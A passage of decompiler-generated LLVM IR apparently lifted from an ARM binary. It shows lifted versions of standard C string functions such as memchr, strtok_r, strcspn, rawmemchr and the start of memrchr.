  uselistorder i32 %v0_19584, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_195a4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_195e0, { 0, 2, 1 }
  uselistorder i32 %v1_195dc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_19560, { 2, 0, 1, 3 }
  uselistorder i32 %v2_19560, { 2, 0, 1, 3 }
  uselistorder i32 %v0_195e4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1967c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_19554, { 1, 0 }
  uselistorder i32 %v0_19554, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1954c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1954c, { 1, 0, 2 }
  uselistorder i32 %v0_1954c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1967c76, { 1, 0 }
  uselistorder i32 %v1_1952c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_19534, { 1, 0 }
  uselistorder i32 %v0_19508, { 3, 0, 1, 2 }
  uselistorder i32 %v1_194fc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_194e8, { 1, 0, 2 }
  uselistorder i32 %v1_194e4, { 1, 0 }
  uselistorder i32 %v1_194dc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_194dc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_194d4, { 0, 2, 1 }
  uselistorder i32 %v3_194d4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_194d4, { 1, 0 }
  uselistorder i1 %v1_194d4, { 1, 0 }
  uselistorder i32 %v3_194d0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_194c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_194b4, { 1, 2, 0 }
  uselistorder i32 %v1_194ac, { 0, 2, 1 }
  uselistorder i32 %v12_194a8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1949c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_194a0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_19490, { 0, 2, 1 }
  uselistorder i32 %v1_19488, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_19488, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_19480, { 1, 0 }
  uselistorder i32 %v1_19478, { 2, 1, 0 }
  uselistorder i32 %v2_19470, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_19470, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1946c, { 1, 0 }
  uselistorder i32 %v2_19460, { 1, 0 }
  uselistorder i32 %v1_19460, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_19460, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 32, 30, 45, 33, 34, 36, 37, 35, 46, 38, 39, 41, 42, 40, 47, 43, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 66, 62, 63, 67, 64, 68, 65, 69, 70, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 7, 6, 9, 0, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 4, 19, 20, 21, 22, 23, 3, 24, 1, 25, 2, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 7, 6, 9, 0, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 20, 21, 22, 3, 23, 1, 24, 2, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 5, 7, 6, 9, 0, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 20, 21, 22, 23, 24, 3, 25, 1, 26, 2, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_198d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19864, { 2, 0, 1 }
  uselistorder label %dec_label_pc_197f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19798, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_19724, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_196e8, { 1, 0 }
  uselistorder label %dec_label_pc_196d4, { 1, 0 }
  uselistorder label %dec_label_pc_19694, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_195bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1955c, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1952c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_194c8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_19488, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_198f4 = urem i32 %arg1, 256
  %v0_19910.pr = load i32, i32* @r2, align 4
  %v2_1991015 = icmp eq i32 %v0_19910.pr, 0
  %v0_19924.pre = load i32, i32* @r0, align 4
  br i1 %v2_1991015, label %dec_label_pc_19920, label %dec_label_pc_19918

dec_label_pc_198fc:                               ; preds = %dec_label_pc_19918
  %v1_198fc = inttoptr i32 %v0_1990c to i8*
  %v2_198fc = load i8, i8* %v1_198fc, align 1
  %v3_198fc = zext i8 %v2_198fc to i32
  %v9_19900 = icmp eq i32 %v3_198fc, %v1_198f4
  br i1 %v9_19900, label %dec_label_pc_199d0, label %dec_label_pc_19908

dec_label_pc_19908:                               ; preds = %dec_label_pc_198fc
  %v1_19908 = add i32 %v0_19908, -1
  %v1_1990c = add i32 %v0_1990c, 1
  %v2_19910 = icmp eq i32 %v1_19908, 0
  br i1 %v2_19910, label %dec_label_pc_19920, label %dec_label_pc_19918

dec_label_pc_19918:                               ; preds = %entry, %dec_label_pc_19908
  %v0_19908 = phi i32 [ %v1_19908, %dec_label_pc_19908 ], [ %v0_19910.pr, %entry ]
  %v0_1990c = phi i32 [ %v1_1990c, %dec_label_pc_19908 ], [ %v0_19924.pre, %entry ]
  %v1_19918 = urem i32 %v0_1990c, 4
  %v2_19918 = icmp eq i32 %v1_19918, 0
  br i1 %v2_19918, label %dec_label_pc_19920, label %dec_label_pc_198fc

dec_label_pc_19920:                               ; preds = %dec_label_pc_19908, %dec_label_pc_19918, %entry
  %v0_1999c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_19908 ], [ %v0_19908, %dec_label_pc_19918 ]
  %v0_19924 = phi i32 [ %v0_19924.pre, %entry ], [ %v1_1990c, %dec_label_pc_19908 ], [ %v0_1990c, %dec_label_pc_19918 ]
  %v4_19920 = mul nuw nsw i32 %v1_198f4, 256
  %v5_19920 = or i32 %v4_19920, %v1_198f4
  %v4_19928 = mul i32 %v5_19920, 65536
  %v5_19928 = or i32 %v4_19928, %v5_19920
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1999c22, 3
  br i1 %tmp, label %dec_label_pc_19930, label %dec_label_pc_199c4.preheader

dec_label_pc_19930:                               ; preds = %dec_label_pc_19920, %dec_label_pc_1999c.backedge
  %v0_1994c60 = phi i32 [ %v1_1994c, %dec_label_pc_1999c.backedge ], [ %v0_1999c22, %dec_label_pc_19920 ]
  %v0_1997059 = phi i32 [ %v4_19930, %dec_label_pc_1999c.backedge ], [ %v0_19924, %dec_label_pc_19920 ]
  %v1_19930 = inttoptr i32 %v0_1997059 to i32*
  %v2_19930 = load i32, i32* %v1_19930, align 4
  %v4_19930 = add i32 %v0_1997059, 4
  %v2_19934 = xor i32 %v2_19930, %v5_19928
  %v2_19938 = add i32 %v2_19934, 2130640639
  %v1_1993c = sub i32 -1, %v2_19934
  %v2_19940 = xor i32 %v2_19938, %v1_1993c
  %v2_19944 = and i32 %v2_19940, -2130640640
  %v2_19948 = icmp eq i32 %v2_19944, 0
  %v1_1994c = add i32 %v0_1994c60, -4
  br i1 %v2_19948, label %dec_label_pc_1999c.backedge, label %dec_label_pc_19954

dec_label_pc_1999c.backedge:                      ; preds = %dec_label_pc_19930, %dec_label_pc_1998c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1994c, 3
  br i1 %tmp73, label %dec_label_pc_19930, label %dec_label_pc_199c4.preheader

dec_label_pc_19954:                               ; preds = %dec_label_pc_19930
  %v2_19954 = inttoptr i32 %v0_1997059 to i8*
  %v3_19954 = load i8, i8* %v2_19954, align 1
  %v4_19954 = zext i8 %v3_19954 to i32
  %v9_1995c = icmp eq i32 %v4_19954, %v1_198f4
  %v1_19960 = add i32 %v0_1997059, 3
  store i32 %v1_19960, i32* @ip, align 4
  br i1 %v9_1995c, label %dec_label_pc_199d0, label %dec_label_pc_19968

dec_label_pc_19968:                               ; preds = %dec_label_pc_19954
  %v1_19968 = add i32 %v0_1997059, 1
  %v2_19968 = inttoptr i32 %v1_19968 to i8*
  %v3_19968 = load i8, i8* %v2_19968, align 1
  %v4_19968 = zext i8 %v3_19968 to i32
  %v9_1996c = icmp eq i32 %v4_19968, %v1_198f4
  br i1 %v9_1996c, label %bb, label %dec_label_pc_1997c

bb:                                               ; preds = %dec_label_pc_19968
  br label %dec_label_pc_199d0

dec_label_pc_1997c:                               ; preds = %dec_label_pc_19968
  %v1_1997c = add i32 %v0_1997059, 2
  %v2_1997c = inttoptr i32 %v1_1997c to i8*
  %v3_1997c = load i8, i8* %v2_1997c, align 1
  %v4_1997c = zext i8 %v3_1997c to i32
  %v9_19980 = icmp eq i32 %v4_1997c, %v1_198f4
  br i1 %v9_19980, label %dec_label_pc_199d0, label %dec_label_pc_1998c

dec_label_pc_1998c:                               ; preds = %dec_label_pc_1997c
  %v2_1998c = inttoptr i32 %v1_19960 to i8*
  %v3_1998c = load i8, i8* %v2_1998c, align 1
  %v4_1998c = zext i8 %v3_1998c to i32
  %v9_19990 = icmp eq i32 %v4_1998c, %v1_198f4
  br i1 %v9_19990, label %bb36, label %dec_label_pc_1999c.backedge

bb36:                                             ; preds = %dec_label_pc_1998c
  br label %dec_label_pc_199d0

dec_label_pc_199c4.preheader:                     ; preds = %dec_label_pc_1999c.backedge, %dec_label_pc_19920
  %v0_19970.lcssa = phi i32 [ %v0_19924, %dec_label_pc_19920 ], [ %v4_19930, %dec_label_pc_1999c.backedge ]
  %v0_1994c.lcssa = phi i32 [ %v0_1999c22, %dec_label_pc_19920 ], [ %v1_1994c, %dec_label_pc_1999c.backedge ]
  %v2_199c47 = icmp eq i32 %v0_1994c.lcssa, 0
  br i1 %v2_199c47, label %dec_label_pc_199cc, label %dec_label_pc_199b4

dec_label_pc_199b4:                               ; preds = %dec_label_pc_199c0, %dec_label_pc_199c4.preheader
  %v0_199c4.in = phi i32 [ %v0_199c4, %dec_label_pc_199c0 ], [ %v0_1994c.lcssa, %dec_label_pc_199c4.preheader ]
  %v0_199c0 = phi i32 [ %v1_199c0, %dec_label_pc_199c0 ], [ %v0_19970.lcssa, %dec_label_pc_199c4.preheader ]
  %v0_199c4 = add i32 %v0_199c4.in, -1
  %v1_199b4 = inttoptr i32 %v0_199c0 to i8*
  %v2_199b4 = load i8, i8* %v1_199b4, align 1
  %v3_199b4 = zext i8 %v2_199b4 to i32
  %v9_199b8 = icmp eq i32 %v3_199b4, %v1_198f4
  br i1 %v9_199b8, label %dec_label_pc_199d0, label %dec_label_pc_199c0

dec_label_pc_199c0:                               ; preds = %dec_label_pc_199b4
  %v1_199c0 = add i32 %v0_199c0, 1
  %v2_199c4 = icmp eq i32 %v0_199c4, 0
  br i1 %v2_199c4, label %dec_label_pc_199cc, label %dec_label_pc_199b4

dec_label_pc_199cc:                               ; preds = %dec_label_pc_199c0, %dec_label_pc_199c4.preheader
  br label %dec_label_pc_199d0

dec_label_pc_199d0:                               ; preds = %dec_label_pc_198fc, %dec_label_pc_1997c, %dec_label_pc_19954, %dec_label_pc_199b4, %bb36, %bb, %dec_label_pc_199cc
  %v1_199d4 = phi i32 [ 0, %dec_label_pc_199cc ], [ %v1_19968, %bb ], [ %v1_19960, %bb36 ], [ %v0_199c0, %dec_label_pc_199b4 ], [ %v1_1997c, %dec_label_pc_1997c ], [ %v0_1997059, %dec_label_pc_19954 ], [ %v0_1990c, %dec_label_pc_198fc ]
  ret i32 %v1_199d4

; uselistorder directives
  uselistorder i32 %v1_1994c, { 1, 0, 2 }
  uselistorder i32 %v0_1997059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_19920, { 1, 0 }
  uselistorder i32 %v0_1999c22, { 1, 2, 0 }
  uselistorder i32 %v0_1990c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_19924.pre, { 1, 0 }
  uselistorder i32 %v1_198f4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_199d0, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1999c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_19930, { 1, 0 }
  uselistorder label %dec_label_pc_19920, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19918, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_199e0 = load i32, i32* @r4, align 4
  store i32 %v3_199e0, i32* %stack_var_-16, align 4
  %v0_199e4 = load i32, i32* @r0, align 4
  store i32 %v0_199e4, i32* %r4.global-to-local, align 4
  %v2_199e4 = icmp eq i32 %v0_199e4, 0
  %v1_199e8 = load i32, i32* @r2, align 4
  br i1 %v2_199e4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_199e8 = inttoptr i32 %v1_199e8 to i32*
  %v3_199e8 = load i32, i32* %v2_199e8, align 4
  store i32 %v3_199e8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_199ec = phi i32 [ %v3_199e8, %bb ], [ %v0_199e4, %entry ]
  store i32 %v0_199ec, i32* @r0, align 4
  store i32 %v1_199e8, i32* %r5.global-to-local, align 4
  %v0_199f4 = load i32, i32* @r1, align 4
  store i32 %v0_199f4, i32* %r6.global-to-local, align 4
  %v1_199f8 = inttoptr i32 %v0_199ec to i8*
  %v2_199f8 = call i32 @__GI_strspn(i8* %v1_199f8)
  %v0_199fc = load i32, i32* %r4.global-to-local, align 4
  %v2_199fc = add i32 %v0_199fc, %v2_199f8
  %v3_199fc = inttoptr i32 %v2_199fc to i8*
  %v4_199fc = load i8, i8* %v3_199fc, align 1
  %v6_199fc = zext i8 %v4_199fc to i32
  store i32 %v6_199fc, i32* %r3.global-to-local, align 4
  store i32 %v2_199fc, i32* @r4, align 4
  %v2_19a04 = icmp eq i8 %v4_199fc, 0
  br i1 %v2_19a04, label %bb8, label %dec_label_pc_19a10

bb8:                                              ; preds = %entry._crit_edge
  %v2_19a08 = load i32, i32* %r5.global-to-local, align 4
  %v3_19a08 = inttoptr i32 %v2_19a08 to i32*
  store i32 %v2_199fc, i32* %v3_19a08, align 4
  br label %dec_label_pc_19a4c

dec_label_pc_19a10:                               ; preds = %entry._crit_edge
  %v0_19a10 = load i32, i32* %r6.global-to-local, align 4
  %v3_19a18 = call i32 @__GI_strpbrk(i8* %v3_199fc, i32 %v0_19a10)
  %v3_19a1c = icmp eq i32 %v3_19a18, 0
  br i1 %v3_19a1c, label %dec_label_pc_19a24, label %dec_label_pc_19a3c

dec_label_pc_19a24:                               ; preds = %dec_label_pc_19a10
  %v0_19a28 = load i32, i32* @r4, align 4
  store i32 %v0_19a28, i32* @r0, align 4
  %v2_19a2c = call i32 @rawmemchr(i32 %v0_19a28, i32 0)
  %v0_19a30 = load i32, i32* @r4, align 4
  store i32 %v0_19a30, i32* %r3.global-to-local, align 4
  %v1_19a34 = load i32, i32* %r5.global-to-local, align 4
  %v2_19a34 = inttoptr i32 %v1_19a34 to i32*
  store i32 %v2_19a2c, i32* %v2_19a34, align 4
  br label %dec_label_pc_19a4c

dec_label_pc_19a3c:                               ; preds = %dec_label_pc_19a10
  %v4_19a18 = inttoptr i32 %v3_19a18 to i8*
  store i8 0, i8* %v4_19a18, align 1
  %v7_19a40 = add i32 %v3_19a18, 1
  %v1_19a44 = load i32, i32* %r5.global-to-local, align 4
  %v2_19a44 = inttoptr i32 %v1_19a44 to i32*
  store i32 %v7_19a40, i32* %v2_19a44, align 4
  %v0_19a48 = load i32, i32* @r4, align 4
  store i32 %v0_19a48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19a4c

dec_label_pc_19a4c:                               ; preds = %bb8, %dec_label_pc_19a24, %dec_label_pc_19a3c
  %v0_19a4c = load i32, i32* %r3.global-to-local, align 4
  %v2_19a50 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19a50, i32* @r4, align 4
  ret i32 %v0_19a4c

; uselistorder directives
  uselistorder i32 %v3_19a18, { 0, 2, 1 }
  uselistorder i32 %v0_199ec, { 1, 0 }
  uselistorder i32 %v0_199e4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i8*)* @__GI_strspn, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19a4c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_19a58 = load i32, i32* @r4, align 4
  store i32 %v3_19a58, i32* %stack_var_-16, align 4
  %v6_19a58 = load i32, i32* @r5, align 4
  %v9_19a58 = load i32, i32* @r6, align 4
  %v0_19a5c = load i32, i32* @r0, align 4
  %v0_19a60 = load i32, i32* @r1, align 4
  store i32 %v0_19a60, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_19a7c8 = inttoptr i32 %v0_19a5c to i8*
  %v2_19a7c9 = load i8, i8* %v1_19a7c8, align 1
  %v2_19a8011 = icmp eq i8 %v2_19a7c9, 0
  store i32 %v0_19a60, i32* @r0, align 4
  %v1_19a8812 = add i32 %v0_19a5c, 1
  store i32 %v1_19a8812, i32* @r4, align 4
  br i1 %v2_19a8011, label %dec_label_pc_19a90, label %dec_label_pc_19a6c

dec_label_pc_19a6c:                               ; preds = %entry, %dec_label_pc_19a78
  %v3_19a7c14.in = phi i8 [ %v2_19a7c, %dec_label_pc_19a78 ], [ %v2_19a7c9, %entry ]
  %v0_19a8413 = phi i32 [ %v0_19a84.pre, %dec_label_pc_19a78 ], [ %v0_19a60, %entry ]
  %v3_19a7c14 = zext i8 %v3_19a7c14.in to i32
  %v2_19a6c = call i32 @__GI_strchr(i32 %v0_19a8413, i32 %v3_19a7c14)
  %v2_19a70 = icmp eq i32 %v2_19a6c, 0
  %v0_19a78 = load i32, i32* @r5, align 4
  br i1 %v2_19a70, label %dec_label_pc_19a78, label %dec_label_pc_19a90

dec_label_pc_19a78:                               ; preds = %dec_label_pc_19a6c
  %v1_19a78 = add i32 %v0_19a78, 1
  %v0_19a7c.pre = load i32, i32* @r4, align 4
  %v0_19a84.pre = load i32, i32* @r6, align 4
  store i32 %v1_19a78, i32* @r5, align 4
  %v1_19a7c = inttoptr i32 %v0_19a7c.pre to i8*
  %v2_19a7c = load i8, i8* %v1_19a7c, align 1
  %v2_19a80 = icmp eq i8 %v2_19a7c, 0
  store i32 %v0_19a84.pre, i32* @r0, align 4
  %v1_19a88 = add i32 %v0_19a7c.pre, 1
  store i32 %v1_19a88, i32* @r4, align 4
  br i1 %v2_19a80, label %dec_label_pc_19a90, label %dec_label_pc_19a6c

dec_label_pc_19a90:                               ; preds = %dec_label_pc_19a78, %dec_label_pc_19a6c, %entry
  %v0_19a90 = phi i32 [ 0, %entry ], [ %v0_19a78, %dec_label_pc_19a6c ], [ %v1_19a78, %dec_label_pc_19a78 ]
  %v2_19a94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19a94, i32* @r4, align 4
  store i32 %v6_19a58, i32* @r5, align 4
  store i32 %v9_19a58, i32* @r6, align 4
  ret i32 %v0_19a90

; uselistorder directives
  uselistorder i8 %v2_19a7c, { 1, 0 }
  uselistorder i32 %v0_19a84.pre, { 1, 0 }
  uselistorder i32 %v0_19a7c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_19a6c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_19aa0 = urem i32 %arg1, 256
  %v0_19ab82 = load i32, i32* @r0, align 4
  %v1_19ab83 = urem i32 %v0_19ab82, 4
  %v2_19ab84 = icmp eq i32 %v1_19ab83, 0
  br i1 %v2_19ab84, label %dec_label_pc_19ac0, label %dec_label_pc_19aa8

dec_label_pc_19aa8:                               ; preds = %entry, %dec_label_pc_19ab4
  %v0_19ab4 = phi i32 [ %v1_19ab4, %dec_label_pc_19ab4 ], [ %v0_19ab82, %entry ]
  %v1_19aa8 = inttoptr i32 %v0_19ab4 to i8*
  %v2_19aa8 = load i8, i8* %v1_19aa8, align 1
  %v3_19aa8 = zext i8 %v2_19aa8 to i32
  %v9_19aac = icmp eq i32 %v3_19aa8, %v1_19aa0
  br i1 %v9_19aac, label %dec_label_pc_19b3c, label %dec_label_pc_19ab4

dec_label_pc_19ab4:                               ; preds = %dec_label_pc_19aa8
  %v1_19ab4 = add i32 %v0_19ab4, 1
  %v1_19ab8 = urem i32 %v1_19ab4, 4
  %v2_19ab8 = icmp eq i32 %v1_19ab8, 0
  br i1 %v2_19ab8, label %dec_label_pc_19ac0, label %dec_label_pc_19aa8

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19ab4, %entry
  %v0_19ac4 = phi i32 [ %v0_19ab82, %entry ], [ %v1_19ab4, %dec_label_pc_19ab4 ]
  %v4_19ac0 = mul nuw nsw i32 %v1_19aa0, 256
  %v5_19ac0 = or i32 %v4_19ac0, %v1_19aa0
  %v4_19ac8 = mul i32 %v5_19ac0, 65536
  %v5_19ac8 = or i32 %v4_19ac8, %v5_19ac0
  br label %dec_label_pc_19acc

dec_label_pc_19acc:                               ; preds = %dec_label_pc_19b2c, %dec_label_pc_19acc, %dec_label_pc_19ac0
  %v0_19b10 = phi i32 [ %v0_19ac4, %dec_label_pc_19ac0 ], [ %v4_19acc, %dec_label_pc_19acc ], [ %v4_19acc, %dec_label_pc_19b2c ]
  %v1_19acc = inttoptr i32 %v0_19b10 to i32*
  %v2_19acc = load i32, i32* %v1_19acc, align 4
  %v4_19acc = add i32 %v0_19b10, 4
  %v2_19ad4 = xor i32 %v2_19acc, %v5_19ac8
  %v2_19ad8 = add i32 %v2_19ad4, 2130640639
  %v1_19ae0 = sub i32 -1, %v2_19ad4
  %v2_19ae4 = xor i32 %v2_19ad8, %v1_19ae0
  %v2_19ae8 = and i32 %v2_19ae4, -2130640640
  %v2_19aec = icmp eq i32 %v2_19ae8, 0
  br i1 %v2_19aec, label %dec_label_pc_19acc, label %dec_label_pc_19af4

dec_label_pc_19af4:                               ; preds = %dec_label_pc_19acc
  %v2_19af4 = inttoptr i32 %v0_19b10 to i8*
  %v3_19af4 = load i8, i8* %v2_19af4, align 1
  %v4_19af4 = zext i8 %v3_19af4 to i32
  %v9_19afc = icmp eq i32 %v4_19af4, %v1_19aa0
  %v1_19b00 = add i32 %v0_19b10, 3
  br i1 %v9_19afc, label %dec_label_pc_19b3c, label %dec_label_pc_19b08

dec_label_pc_19b08:                               ; preds = %dec_label_pc_19af4
  %v1_19b08 = add i32 %v0_19b10, 1
  %v2_19b08 = inttoptr i32 %v1_19b08 to i8*
  %v3_19b08 = load i8, i8* %v2_19b08, align 1
  %v4_19b08 = zext i8 %v3_19b08 to i32
  %v9_19b0c = icmp eq i32 %v4_19b08, %v1_19aa0
  br i1 %v9_19b0c, label %bb, label %dec_label_pc_19b1c

bb:                                               ; preds = %dec_label_pc_19b08
  br label %dec_label_pc_19b3c

dec_label_pc_19b1c:                               ; preds = %dec_label_pc_19b08
  %v1_19b1c = add i32 %v0_19b10, 2
  %v2_19b1c = inttoptr i32 %v1_19b1c to i8*
  %v3_19b1c = load i8, i8* %v2_19b1c, align 1
  %v4_19b1c = zext i8 %v3_19b1c to i32
  %v9_19b20 = icmp eq i32 %v4_19b1c, %v1_19aa0
  br i1 %v9_19b20, label %dec_label_pc_19b3c, label %dec_label_pc_19b2c

dec_label_pc_19b2c:                               ; preds = %dec_label_pc_19b1c
  %v2_19b2c = inttoptr i32 %v1_19b00 to i8*
  %v3_19b2c = load i8, i8* %v2_19b2c, align 1
  %v4_19b2c = zext i8 %v3_19b2c to i32
  %v9_19b30 = icmp eq i32 %v4_19b2c, %v1_19aa0
  br i1 %v9_19b30, label %dec_label_pc_19b38, label %dec_label_pc_19acc

dec_label_pc_19b38:                               ; preds = %dec_label_pc_19b2c
  br label %dec_label_pc_19b3c

dec_label_pc_19b3c:                               ; preds = %dec_label_pc_19aa8, %dec_label_pc_19b1c, %dec_label_pc_19af4, %bb, %dec_label_pc_19b38
  %v1_19b40 = phi i32 [ %v1_19b00, %dec_label_pc_19b38 ], [ %v1_19b08, %bb ], [ %v1_19b1c, %dec_label_pc_19b1c ], [ %v0_19b10, %dec_label_pc_19af4 ], [ %v0_19ab4, %dec_label_pc_19aa8 ]
  ret i32 %v1_19b40

; uselistorder directives
  uselistorder i32 %v4_19acc, { 1, 0 }
  uselistorder i32 %v0_19b10, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_19ac0, { 1, 0 }
  uselistorder i32 %v1_19ab4, { 1, 0, 2 }
  uselistorder i32 %v0_19ab82, { 2, 1, 0 }
  uselistorder i32 %v1_19aa0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19b3c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_19aa8, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_19b50 = urem i32 %arg2, 256
  %v2_19b54 = add i32 %arg3, %arg1
  %v2_19b6c4 = icmp eq i32 %arg3, 0
  br i1 %v2_19b6c4, label %dec_label_pc_19b7c, label %dec_label_pc_19b74

dec_label_pc_19b5c:                               ; preds = %dec_label_pc_19b74
  %v1_19b5c = add i32 %v0_19b5c, -1
  %v2_19b5c = inttoptr i32 %v1_19b5c to i8*
  %v3_19b5c = load i8, i8* %v2_19b5c, align 1
  %v4_19b5c = zext i8 %v3_19b5c to i32
  %v9_19b60 = icmp eq i32 %v4_19b5c, %v1_19b50
